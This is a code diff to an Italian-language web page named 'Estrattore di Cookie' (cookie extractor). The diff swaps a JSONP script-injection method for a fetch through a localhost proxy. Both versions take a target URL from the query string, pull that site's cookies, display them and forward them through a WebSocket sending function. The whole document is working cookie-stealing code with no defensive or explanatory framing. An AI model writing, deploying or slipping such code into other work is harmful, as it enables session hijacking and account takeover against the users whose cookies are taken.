@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Estrattore di Cookie via JSONP</title>
+    <title>Estrattore di Cookie</title>
 </head>
 <body>
-    <h1>Estrattore di Cookie via JSONP</h1>
+    <h1>Estrattore di Cookie</h1>
     <script>
         // Funzione per ottenere i parametri di query
         function getQueryParams() {
@@ -38,21 +38,6 @@
             };
         }
 
-        // Funzione JSONP per ottenere i cookie
-        function getCookiesJSONP(url) {
-            const script = document.createElement('script');
-            script.src = `${url}?callback=handleCookies`;
-            document.body.appendChild(script);
-        }
-
-        // Callback JSONP
-        function handleCookies(data) {
-            const cookies = JSON.stringify(data.cookies);
-            alert('Cookies: ' + cookies);
-            console.log('Cookies:', cookies);
-            sendCookiesViaWebSocket(cookies);
-        }
-
         // Ottieni i parametri di query
         const queryParams = getQueryParams();
         const url = queryParams.url;
@@ -60,7 +45,18 @@
         if (!url) {
             alert('URL mancante nel parametro di query.');
         } else {
-            getCookiesJSONP(url);
+            fetch(`http://localhost:3000/proxy?url=${encodeURIComponent(url)}`)
+                .then(response => response.json())
+                .then(data => {
+                    const cookies = JSON.stringify(data.cookies);
+                    alert('Cookies: ' + cookies);
+                    console.log('Cookies:', cookies);
+                    sendCookiesViaWebSocket(cookies);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    alert('Error fetching cookies: ' + error);
+                });
         }
     </script>
 </body>
